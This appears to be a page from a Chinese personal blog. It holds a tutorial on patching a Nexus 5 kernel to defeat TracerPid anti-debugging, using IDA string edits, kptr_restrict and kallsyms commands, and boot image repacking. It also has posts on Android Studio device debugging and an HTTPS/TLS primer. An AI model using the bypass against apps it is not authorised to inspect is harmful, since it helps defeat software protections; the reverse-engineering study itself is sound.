<h3 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h3><h4 id="用IDA直接打开zImage文件-并做如下改动"><a href="#用IDA直接打开zImage文件-并做如下改动" class="headerlink" title="用IDA直接打开zImage文件, 并做如下改动"></a>用IDA直接打开zImage文件, 并做如下改动</h4><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552653260/IDA1_zugiws.png" alt></p>
<p>点击OK之后, 继续按照下面修改。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659040/IDA2_t9pvte.png" alt></p>
<h4 id="定位函数位置"><a href="#定位函数位置" class="headerlink" title="定位函数位置"></a>定位函数位置</h4><p>打开命令提示符, 输入如下指令关闭符号屏蔽, 并查看函数地址, 因为在IDA中查看二进制文件不好直接用函数名进行定位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[your username]&gt;adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # echo 0 &gt; /proc/sys/kernel/kptr_restrict /*关闭符号屏蔽*/</span><br><span class="line">root@hammerhead:/ # cat /proc/kallsyms |grep proc_pid_status</span><br><span class="line">root@hammerhead:/proc # cat /proc/kallsyms |grep __task_pid_nr_ns</span><br></pre></td></tr></table></figure></p>
<p>函数地址如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552655198/fuposition_lrj63p.png" alt></p>
<p>在IDA中按下快捷键G跳转到c01b0884(__task_pid_nr_ns函数)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659250/f1_otrhpf.png" alt></p>
<p>之后点击函数名c01b0884(__task_pid_nr_ns函数), 按下快捷键X, 会弹出交叉引用, 在其中查找我们上面找的第二个函数c02ba04c( proc_pid_status)的位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659761/f2_iuuo1l.png" alt><br>好的, 上面选中的并不是我想找的函数TAT。这个时候, 就在IDA界面中按下<code>Shift+F12</code>, 在字符串界面查找<code>TracerPid</code>。找到之后双击查询后的结果。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552661104/f3_zrynlg.png" alt><br>IDA在解析的时候没有解析好这个文件, 出现了下面的情况。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552661543/f4_tn3sq3.png" alt><br>这时候选中<code>S</code>的位置即<code>0x53</code>按下<code>A</code>, 即可正常解析。如果解析出来还不是下面这种格式，可以鼠标左键选中该字符串的所有内容再按一次<code>A</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552703909/CHSU_cre1cq.png" alt><br>如果字符串都解析出来之后, 还是识别不出来c02ba04c( proc_pid_status)函数的话, 直接<code>G</code>跳转到c02ba04c, 并按下C, 但是识别的函数也不是正确的。所以这里采用第三篇参考文章的方法, 直接修改TracePid字符串。</p>
<h4 id="修改TracePid字符串"><a href="#修改TracePid字符串" class="headerlink" title="修改TracePid字符串"></a>修改TracePid字符串</h4><p>(1) 选中<code>TracePid</code>中的<code>%d</code><br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552706938/S1_g980jo.png" alt></p>
<p>(2) 将<code>TracePid</code>中的<code>%d</code>改为<code>0\t</code>, 选中<code>%d</code>后按下<code>Alt</code>+<code>4</code>。<br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552707440/p1_mebj3m.png" alt></p>
<p>上图中第四行第一个<code>%d</code>就是我们要修改的(TracerPid后的字符串), 十六进制为<code>25 64</code>。点击<code>25</code>前面按下<code>F2</code>, 输入<code>30 09</code>, 再按下<code>F2</code>就修改成功了。<br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552708361/p2_luiaxd.png" alt></p>
<p>最后保存修改的内容, 按下图点开之后直接点OK即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552708651/p3_zozpyy.png" alt></p>
<h4 id="修改kernel文件"><a href="#修改kernel文件" class="headerlink" title="修改kernel文件"></a>修改kernel文件</h4><p>在MinGW命令行界面输入命令<code>gzip -n -f -9 zImage</code>, 压缩修改好的文件<code>zImage</code>生成<code>zImage.gz</code>。用<code>010 Editor</code>打开文件<code>kernel</code>, 并在<code>kernel</code>中查找<code>1F 8B 08 00</code>。(下图是覆盖完成的样子)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1553071178/1553071092_1_fg4s6b.png" alt></p>
<p>选中<code>1F 8B 08 00</code>位置之后，点开<code>Edit</code>-&gt;<code>Insert/Overwrite</code>-&gt;<code>Overwrite File...</code>, 选择<code>zImage.gz</code>文件即可, 这样就不用自己计算文件大小并且直接覆盖了, 完成之后点击保存为新的文件<code>boot-new.img</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552722307/succ_eyefab.png" alt></p>
<p>使用执行unmkbootimg生成的命令, 修改-o参数名(要输出的文件名), 直接拷贝到MinGW命令行中直接执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    $ mkbootimg --base 0 --pagesize 2048 --kernel_offset 0x00008000 --ramdisk_offset 0x02900000 --second_offset 0x00f00=</span><br><span class="line">000 --tags_offset 0x02700000 --cmdline &apos;console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 max</span><br><span class="line">cpus=2 msm_watchdog_v2.enable=1&apos; --kernel kernel --ramdisk ramdisk.cpio.gz -o boot-new.img</span><br></pre></td></tr></table></figure></p>
<ol start="5">
<li>刷机<br>我这里用的是<a href="http://www.kgfanr.com/articles/3019.html" target="_blank" rel="noopener">Nexus 5</a>, 直接在关机状态下按<code>音量键-</code>和<code>开机键</code>(或输入命令<code>adb reboot bootloader</code>)即可进入fastboot状态。在命令行中输入<code>fastboot flash boot boot-new.img</code>, 之后再输入<code>fastboot reboot</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552722558/succ2_yzvx0w.png" alt></li>
</ol>
<p>刷完倒是能正常开机了, 但是我手机又要重新root了…..(这个时候有尝试过用SuperSU刷成砖, 还是用magisk+twrp比较好)</p>
<h1 id="参考材料-文章"><a href="#参考材料-文章" class="headerlink" title="参考材料\文章"></a>参考材料\文章</h1><p><a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/" target="_blank" rel="noopener">逆向修改内核，绕过TracerPID反调试</a><br><a href="https://sourceforge.net/p/mingw/bugs/1552/" target="_blank" rel="noopener">make: cc: Command not found</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/65936634" target="_blank" rel="noopener">Android逆向之旅—应用的”反调试”方案解析(附加修改IDA调试端口和修改内核信息)</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/03/14/尝试绕过TracerPID反调试一/" data-id="ckrzo1bja000ddfrt99hn4frf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-用Android-Studio调试Nexus-5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/09/用Android-Studio调试Nexus-5/" class="article-date">
  <time datetime="2019-03-10T01:55:41.000Z" itemprop="datePublished">2019-03-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/09/用Android-Studio调试Nexus-5/">用Android Studio调试Nexus 5</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>Android 4.4<br>Windows 10</p>
<h2 id="Nexus-5-准备"><a href="#Nexus-5-准备" class="headerlink" title="Nexus 5 准备"></a>Nexus 5 准备</h2><ol>
<li><p>找到版本号, 并在版本号所在位置点击7次, 打开开发者选项。版本号位置：设置(Setting)-&gt;关于手机(About phone)-&gt;版本号(Build number)</p>
</li>
<li><p>打开开发者选项(Developer options),勾选USB debugging。</p>
</li>
<li><p>在命令行中输入<code>adb devices</code>,有个前提就是需要将<code>android_sdk/platform-tools/</code>设为全局变量，或者进入到该文件夹中才能使用adb。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552126212/1_tcgmnn.png" alt></p>
</li>
<li><p>在网上搜<a href="https://www.kingoapp.com/android-root/download.htm" target="_blank" rel="noopener">Kingo root</a>, 将Nexus 5 与电脑连接, 将手机root, 提示用Kingo root的时候需要科学上网，不然就不能更新库文件啥的。(其实这一步要不是因为之后怕IDA调试的时候要用到, 不然这一步是可以直接省去的)不过在找root工具的时候，发现root工具好像是利用android系统的漏洞实现提权的，以后有时间好好了解一下。</p>
<h2 id="Android-Studio-准备"><a href="#Android-Studio-准备" class="headerlink" title="Android Studio 准备"></a>Android Studio 准备</h2></li>
<li><p>点开Edit Configurations…<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552204133/1_vutojr.png" alt></p>
</li>
<li><p>将Target选项改选为<code>USB Device</code>，据说，在windows上需要下载USB drive，不知道是最新版的改了还是我之前就下载了，很奇妙地能直接使用。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552204472/1_hhkcx4.png" alt></p>
</li>
<li><p>在Android Studio中查看是否已经连接上真机。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552205774/a_xdgmcj.png" alt></p>
</li>
<li><p>然后点击下图红框框中的按钮, 就可以直接将apk安装到真机上并且直接运行了, 快乐。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552205588/1_wwaqrx.png" alt></p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/03/09/用Android-Studio调试Nexus-5/" data-id="ckrzo1bjc000hdfrtv20d6l3t" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HTTP系列(五)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/11/HTTP系列(五)/" class="article-date">
  <time datetime="2018-09-11T15:35:09.000Z" itemprop="datePublished">2018-09-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/11/HTTP系列(五)/">HTTP系列(五)：安全</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>如果, 你伴随HTTP系列一路成长, 那么现在的你, 已经可以乘船开启(学习)HTTP安全之旅。我保证,你会很享受这个学习过程。🙂</p>
<p>许多公司都是安全漏洞的受害者, 一些知名的公司, 比如Dropbox(支持文件同步、备份、共享云存储的软件)、Linkedin(领英, 全球最大职业社交网站)、MySpace(社交网站)、Adobe、索尼和福布斯等许多公司遭受过恶意攻击。除此之外, 许多用户也被(恶意攻击公司的事件)危及过, 你, 很可能曾是受害者之一。🙂</p>
<p>你可以在<a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">Have I Been Pwned</a>查询你是否是受害者之一。</p>
<p>我的电子邮件地址出现在4个不同的存在安全漏洞的网站上。</p>
<p>Web应用安全涉及面广, 因此, 只有一篇文章难以涵盖所有的知识。不过, 本文可作为(Web应用安全的)启蒙。首先, 让我们来了解一下, HTTP协议如何安全地通信。</p>
<p>本文是<a href>HTTP系列</a>的第五部分。</p>
<p>文章概要：</p>
<ul>
<li><a href>你真的需要HTTPS吗?</a></li>
<li><a href>HTTPS的基本概念</a><ul>
<li><a href>SSL vs TLS</a></li>
<li><a href>TLS握手</a></li>
<li><a href>证书(Certificate)及证书认证(CAs, Certification Authorities)</a></li>
<li><a href>证书链(certificate chain)</a></li>
</ul>
</li>
<li><a href>HTTPS的不足</a></li>
</ul>
<p>文章涵盖了大量的内容, 不管怎样, 我们从头学起吧！</p>
<h2 id="你真的需要HTTPS吗"><a href="#你真的需要HTTPS吗" class="headerlink" title="你真的需要HTTPS吗?"></a>你真的需要HTTPS吗?</h2><p>你可能认为, 不是所有的网站都需要安全防护的。如果一个网站不提供敏感信息, 也不能以任何形式上传数据, 仅仅是为了在URL栏上可以显示绿色的标志(网站安全的标志), 就去购买证书和降低访问网站的速度, 这看起来像是想要杀猪却用了宰牛刀。</p>
<p>如果有一个属于你的网站, 你就会知道加载速度——越快越好——对网站来说是至关重要的, 因此, 你不会想给你的网站增加负担。</p>
<p>从HTTP迁移到HTTPS是一个痛苦的过程, 何必为了维护原本就不用被保护的网站遭受这样的痛苦呢?你要考虑的第一件事, 就是出钱买网站的安全——因为购买证书对于一般的小公司或个人来说是一笔很大的费用。</p>
<p><em>注: 听说已经有机构开始颁发免费证书, 详情可以从<a href="https://blog.csdn.net/ithomer/article/details/78075006" target="_blank" rel="noopener">十大免费SSL证书：网站免费添加HTTPS加密
</a>中了解</em></p>
<p>现在就让我们一起来看看, (为安全)惹上这个麻烦到底值不值得。</p>
<h3 id="HTTPS给报文加密并防止中间人攻击"><a href="#HTTPS给报文加密并防止中间人攻击" class="headerlink" title="HTTPS给报文加密并防止中间人攻击"></a>HTTPS给报文加密并防止中间人攻击</h3><p>在之前的HTTP系列文章中, 我们谈论了不同的HTTP认证机制及其安全缺陷。然而, 不管是basic认证还是digest认证, <strong>都不能阻止中间人攻击</strong>。中间人攻击——中间人, 就是恶意介入用户与网站通信的一批人——的目的是拦截双方通信的原始报文(如果有需要, 还可以修改报文), 通过转发拦截的报文, (这个攻击行为)就能不被发现。<br><img src="https://code-maze.com/wp-content/uploads/2017/07/MITM.png" alt><br>原本参与通信的人可能不能察觉到他们的通信正在被监听。</p>
<p>HTTPS通过加密通信(报文)防止中间人攻击, 但是这并不意味着(双方的)通信不会再被监听, 它仅仅阻止了那些查看和拦截(双方通信)报文的人看报文内容罢了。如果中间人想要将报文解密, 那么他必须要有解密的密钥。之后, 你就会知道, 这个密钥是如何起作用的。</p>
<p>让我们继续往下走。</p>
<h3 id="HTTPS——影响搜索排名的因素"><a href="#HTTPS——影响搜索排名的因素" class="headerlink" title="HTTPS——影响搜索排名的因素"></a>HTTPS——影响搜索排名的因素</h3><p>不久之前(2014年), <a href="https://www.wosign.com/news/Google_https.htm" target="_blank" rel="noopener">Google让HTTPS成为一个影响(搜索算法)排名的因素</a>。</p>
<p>这意味着什么呢？</p>
<p>这意味着, 如果你是一个关心Google搜索排名的网络管理员, 你的网站一定要用HTTPS协议。尽管HTTPS没有内容质量、反向链接这些因素影响力大, 但它还是很重要的。</p>
<p>Google通过这项举措鼓励网站管理员尽快(从HTTP)过渡到HTTPS, 从而提高互联网整体的安全性。</p>
<h3 id="证书-完全免费"><a href="#证书-完全免费" class="headerlink" title="(证书)完全免费"></a>(证书)完全免费</h3><p>要架设HTTPS网站, 就需要一个证书来解决证书认证的问题。从前, 证书费用高昂, 并且年年需要更新。</p>
<p>如今, 感谢<a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s encrypt</a>的小伙伴们, 让我们付得起买证书的钱(只要0元!)。那些证书是真的完全免费的！</p>
<p>Let’s encrypt的证书安装起来很简单, 这离不开其背后大公司的支持和超棒的社区人员（的努力）。看看Let’s encrypt的赞助商和支持(Let’s encrypt)的公司的名单, 其中可能有你认识的公司。</p>
<p>Let’s encrypt只提供域名认证(DV)证书, 不提供组织认证(OV)证书和扩展验证(EV)证书。DV证书只能用90天, 不过更新起来很容易。</p>
<p>和其他(好的)技术相同, Let’s encrypt证书也有不好的一面。正因为现在证书获取起来很容易, <a href="https://www.bleepingcomputer.com/news/security/14-766-lets-encrypt-ssl-certificates-issued-to-paypal-phishing-sites/" target="_blank" rel="noopener">钓鱼网站也开始利用起这些证书了</a>。</p>
<h3 id="关于-传输-速度"><a href="#关于-传输-速度" class="headerlink" title="关于(传输)速度"></a>关于(传输)速度</h3><p>一提到HTTPS, 许多人就会认为它给速度带来了了额外的开销。简单地用<a href="http://httpvshttps.com/" target="_blank" rel="noopener">httpvshttps.com</a>来测试一下。</p>
<p>下面是测试结果:<br>！<a href="https://code-maze.com/wp-content/uploads/2017/07/httpvshttpsresults-1.png" target="_blank" rel="noopener"></a><br>所以这里发生了什么?为什么HTTPS比HTTP快那么多?这怎么可能!</p>
<p>HTTPS是使用HTTP 2.0协议的必要条件。</p>
<p>如果我们查看网络选项卡, 我们可以看到在使用HTTPS时，图像是通过HTTP 2.0协议加载的, 除此之外, 流量看起来也很不一样。</p>
<p>HTTP 2.0是继HTTP/1.1之后成功的HTTP协议。</p>
<p>在HTTP/1.1的基础之上, HTTP 2.0增加了许多优点:</p>
<ul>
<li>用二进制(传输)取代文本(传输)</li>
<li>可通过单个TCP连接并行发送多个请求</li>
<li>采用<a href="http://www.cnblogs.com/ghj1976/p/4586529.html" target="_blank" rel="noopener">HPACK</a>压缩报文首部减少(流量)开销</li>
<li>使用新的应用层协议协商(Application-Layer Protocol Negotiation，简称ALPN)扩展更快地加密通信。</li>
<li>可降低RTT(round trip times, 往返时延), 让网站加载的速度更快。</li>
<li>还有许多其他的优点</li>
</ul>
<h3 id="不使用HTTPS-浏览器表示拒绝。"><a href="#不使用HTTPS-浏览器表示拒绝。" class="headerlink" title="不使用HTTPS?浏览器表示拒绝。"></a>不使用HTTPS?浏览器表示拒绝。</h3><p>如果你现在还不相信——使用HTTPS是必要的——那么你应该知道, 现在一些浏览器已经开始举起的大旗, 反对(传输)那些未经加密内容。在16年9月份的时候, Google发布博文明确地说明了Chrome浏览器会怎么对待那些不安全的网站。</p>
<p>现在, 让我们来看一下Chrome 56的前后变化吧!</p>
<p><img src="https://code-maze.com/wp-content/uploads/2017/07/https-shaming-1.png" alt></p>
<p>下面是最终的效果。</p>
<p><img src="https://code-maze.com/wp-content/uploads/2017/07/https-shaming-2.png" alt></p>
<p>你现在相信了吧！😀</p>
<h3 id="迁移到HTTPS的过程很复杂"><a href="#迁移到HTTPS的过程很复杂" class="headerlink" title="迁移到HTTPS的过程很复杂"></a>迁移到HTTPS的过程很复杂</h3><p>(迁移过程复杂)这是过去遗留下来的问题。因为历史悠久的网站之前用HTTP协议上传了大量的资源, 这让迁移至HTTPS对这些网站来说就更加困难了, 不过托管的平台通常都会让这个过程变得简单一点。</p>
<p>大部分托管平台都提供了自动往HTTPS迁移的方法, 点击选项栏的一个按钮就可以轻松迁移。</p>
<p>如果你打算搭建一个基于HTTPS的网站, 你需要先去确认一下, 托管平台是否有提供往HTTPS迁移的方法。或者, 有一个脚本, 可以通过Let’s encrypt和设置服务器配置让你自己解决迁移的问题。</p>
<p>以上, 都是要迁移到HTTPS的原因。有什么理由不去做呢?</p>
<p>文章写到这里, 希望我已经说服你, 用HTTPS是有必要的, 并且这可以让你有动力将网站往迁移HTTPS迁移, 知道HTTPS是如何工作的。</p>
<h2 id="HTTPS的基本概念"><a href="#HTTPS的基本概念" class="headerlink" title="HTTPS的基本概念"></a>HTTPS的基本概念</h2><p>HTTPS(Hypertext Transfer Protocol Secure, 超文本传输安全协议)准确地说, 是客户端和服务器在用HTTP进行通信的基础上, 增加使用安全的SSL/TLS的协议。</p>
<p>在之前的HTTP系列文章中, 我们已经了解过HTTP的工作原理了, 不过SSL/TLS却没有提到。SSL和TLS到底是什么?为什么要使用他们?</p>
<p>下面, 就让我们来了解一下。</p>
<h3 id="SSL-vc-TLS"><a href="#SSL-vc-TLS" class="headerlink" title="SSL vc TLS"></a>SSL vc TLS</h3><p>SSL(Secure Socket Layer, 安全套接层)和TLS(Transport Layer Security, 传输安全协议)可互换使用, 但实际上, 现在提到SSL可能就是在说TLS。</p>
<p>SSL一开始是由网景(Netscape)公司提出的, 不过它的1.0版本早已停用。SSL的2.0版本和3.0版本在1995、1996年相继现世,这两个版本在出现之后, 即便是之后TLS已经开始推行了, 也沿用了很长一段时间(至少对IT行业来说, 时间挺长的)。直到2014年<a href="https://www.puritys.me/zh_cn/docs-blog/article-376-HTTP-:-SSLv3-%E6%BC%8F%E6%B4%9E---Poodle-%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">Poodle攻击</a>发生之后才有所改变。当时服务器支持从TLS降级到SSL,这是Poodle攻击如此成功的主要原因。</p>
<p>SSL一开始是由网景(Netscape)公司提出的, 不过它的1.0版本早已停用。SSL的2.0版本和3.0版本在1995、1996年相继现世, 即便是之后TLS已经开始推行了, 也沿用了很长一段时间(至少对IT行业来说, 时间挺长的)。2014年, 当时服务器支持从TLS降级到SSL, 这是<a href="https://www.puritys.me/zh_cn/docs-blog/article-376-HTTP-:-SSLv3-%E6%BC%8F%E6%B4%9E---Poodle-%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">Poodle攻击</a>发生之后如此成功的主要原因。</p>
<p>从此之后, 服务器<strong>降级到SSL的功能已经完全消失了</strong>。</p>
<p>如果你用<a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">Qualys SSL Labs tool</a>检查你或其他人的网站, 你可能会看到这个:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/www.code-maze.com-Powered-by-Qualys-SSL-Labs.png" alt><br>你可以看到, 根本不支持SSL 2和3, 而TLS 1.3还未启用。</p>
<p>不过, 因为SSL流行了很长一段时间, 它已经成为了大部分人熟悉的术语, 现在被用于许多方面。 因此, 当你听到有人用SSL代替TLS, 这是个历史遗留问题, 别想少了, 他们真正想说的不是SSL。</p>
<p>因为我们要摆脱那种表达方式, 所以从现在开始, 我会用TLS, 毕竟这个会更加准确。</p>
<p>那么, 客户端和服务器到底是怎样建立安全连接的？</p>
<h3 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h3><p>客户端和服务器在进行真正的、加密过的通信之前会有一个”TLS握手”的过程。</p>
<p>下面是TLS的工作原理(非常简单, 后面有附加连接)。<br><img src="https://code-maze.com/wp-content/uploads/2017/07/TLS-handshake.png" alt></p>
<p>在建立完连接之后, 会开始加密通信。</p>
<p>真的TLS握手机制会比这个图更加复杂, 不过, 只是为了实现HTTPS协议, 你不必了解所有的真实的细节。</p>
<p>如果你想确切了解 TLS 握手的工作原理, 可以在<a href="https://www.ietf.org/rfc/rfc2246.txt" target="_blank" rel="noopener">RFC 2246</a>中找找看。</p>
<p>TLS握手的过程中, 发送的证书扮演着什么样的角色?又是怎样颁发的呢?让我们来一起看看吧!</p>
<h3 id="证书-Certificate-及证书认证-CAs-Certification-Authorities"><a href="#证书-Certificate-及证书认证-CAs-Certification-Authorities" class="headerlink" title="证书(Certificate)及证书认证(CAs, Certification Authorities)"></a>证书(Certificate)及证书认证(CAs, Certification Authorities)</h3><p>证书是通过 HTTPS 进行安全通信的关键部分, 它由受信任的证书颁发机构颁发。</p>
<p>数字证书让网站的用户在使用网站时可以以安全的方式进行通信。</p>
<p>比如, 在浏览我的文章时, 证书是这个样子的:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/Code-Maze-Certificate-modified.png" alt></p>
<p>如果你用的是Chrome浏览器, 你可以按F12打开开发者工具安全栏查看证书。</p>
<p>我想要点明两件事。在上图的第一个红色框框里, 你可以看到证书的真实目的。它是用来确保你访问的是正确的网站的如果有些网站伪造成你真正想进行通信的网站, 你的浏览器一定会提醒你的。</p>
<p>第二, 浏览器<strong>左边最上面的那个绿色的”安全”标志, 只能说明你是在和有证书的网站在进行通信</strong>, 并不能证明你是在与原本想通信的网站进行通信。因此, 要小心了。如果恶意攻击者有一个合法的域名及证书的话, 那么他们就能窃取你的身份凭证了。🙂</p>
<p><em>注: 有些钓鱼网站, 通过用与大型网站相似的域名申请域名证书(比如用Web1.com替代原本的Webone.com), 瞒过了浏览器的法眼, 骗取用户的身份凭证或其他重要信息。</em></p>
<p>扩展验证证书(EV, Extended validation certificates), 换句话说, 就是用来证明网站是由合法实体(域名持有者或公司)持有的证书。不过, 现在EV证书的可用性还存在着争议, 因为可能不适用于互联网上的特殊用户(比如为经过浏览器安全功能训练的用户)。你可以在URL栏左方看到EV证书持有者的名字。例如, 当你访问twitter.com的时候, 你可以看到:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/Twitter-EV-certificate.png" alt></p>
<p>这意味着, 网站用EV证书来证明其背后的持有者(或公司)。</p>
<h3 id="证书链-certificate-chain"><a href="#证书链-certificate-chain" class="headerlink" title="证书链(certificate chain)"></a>证书链(certificate chain)</h3><p>任何一个服务器都可以(向客户端)发送数字证书, 并以此声称它们就是你想要访问的那个服务器。所以, 到底是什么让你使用的浏览器信任服务器返回的证书呢?</p>
<p>这里, 就要引入根证书了。通常, 证书都是链接起来的,<br>(链接最顶层的)根证书是你的电脑全心全意地信任的一个证书。</p>
<p>我博客的证书链是这个样子的:<br><img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1537102525/certificate-chain-1_xpgrij.png" alt></p>
<p>最底层的是我的域名证书, 这是由它的上一级的证书签署的, 它的上一级证书是上上级证书签署的…这样循环往复直到最顶层的根证书。</p>
<p>不过, 到底是谁签署的根证书呢？</p>
<p>好吧, 告诉你, 是它自己给自己签署的!😀</p>
<p><img src="https://code-maze.com/wp-content/uploads/2017/07/root-certificate.png" alt><br>颁发给: 域根证书; 颁发者: 域根证书。</p>
<p>你的电脑和浏览器会有一个信任的根证书名单, 这些根证书依靠确认你浏览的域名是通过验证的(来保证服务器端证书是值得信任的)。若证书链由于某些原因断裂了——当时我在我博客上开启了CDN[内容分发网络], 就出现了这样的问题——你的电脑会显示你的网站是”不安全”的。</p>
<p>在键盘上按win+R输入” certmgr.msc”后运行证书管理器, 就可以在windows系统上查询信任的根证书的名单。然后, 你可以在受信任的根证书颁发机构文件夹中找到电脑信任的证书。这个名单适用于Windows系统、IE浏览器、Chrome浏览器和Firefox浏览器, 换言之, 他们自己在管理自己(信任的证书)的名单。</p>
<p>通过交换证书, 客户端和服务器能确认与对方进行通信的人是正确的, 并且可以开始加密传输报文了。</p>
<h2 id="HTTPS的不足"><a href="#HTTPS的不足" class="headerlink" title="HTTPS的不足"></a>HTTPS的不足</h2><p>HTTPS有时会让人误以为当前站点是绝对安全的，实际上启用HTTPS机制只是提高了网站对某些认证攻击的防御能力，比如中间人攻击。但实际上，如果网站后端代码有问题，还是会存在一些其它漏洞，除了中间人攻击之外，还有很多种窃取用户信息的方式。</p>
<p>而且，如果HTTPS本身的设置有问题的话，依然可能发生中间人攻击。网站管理员可能会误以为，只要使用了HTTPS，就不存在中间人攻击了。</p>
<p>如果网站登录页面的后端代码存在漏洞，即使使用了HTTPS机制，也还是会导致用户账号密码泄露。所以，根本方法，要解决整个网站的安全问题，而不仅仅是企图依赖于HTTPS。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是<a href>HTTP系列</a>的全部了希望你可以从中受益, 或者(通过文章)你理解了你曾经不能理解的概念。</p>
<p>在写文章的过程中, 我获得了喜悦和大量的新知识。希望我的文章也能给你带来快乐(或者至少于都过程是享受的)。🙂</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2018/09/11/HTTP系列(五)/" data-id="ckrzo1bj50007dfrtqpxcalm5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/">HTTP</a></li></ul>

    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Se8S0n<br>
    </div>
  </div>
</footer>
    </div>
    
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="//imsky.github.io/holder/holder.js"></script>


<script src="/js/script.js"></script>

  </div>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script> 
</body>
</html>